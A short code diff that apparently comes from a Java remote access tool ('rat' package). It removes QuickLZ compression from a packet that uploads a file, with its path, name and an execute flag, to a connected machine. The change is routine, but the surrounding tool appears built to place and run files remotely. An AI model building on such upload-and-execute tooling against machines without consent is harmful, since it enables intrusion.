@@ -4,7 +4,6 @@ import java.io.File;
 
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.util.QuickLZ;
 
 public final class UploadFilePacket implements IPacket {
 	
@@ -47,10 +46,8 @@ public final class UploadFilePacket implements IPacket {
 	
 	@Override
 	public void send(final ActiveConnection connection) {
-		final byte[] compressed = QuickLZ.compress(data);
-		
-		connection.writeInt(compressed.length);
-		connection.write(compressed);
+		connection.writeInt(data.length);
+		connection.write(data);
 		connection.writeUTF(directoryPath);
 		connection.writeUTF(fileName);
 		connection.writeByte(executeType);
@@ -62,7 +59,6 @@ public final class UploadFilePacket implements IPacket {
 		
 		data = new byte[length];
 		connection.read(data);
-		data = QuickLZ.decompress(data);
 		
 		directoryPath = connection.readUTF();
 		fileName = connection.readUTF();
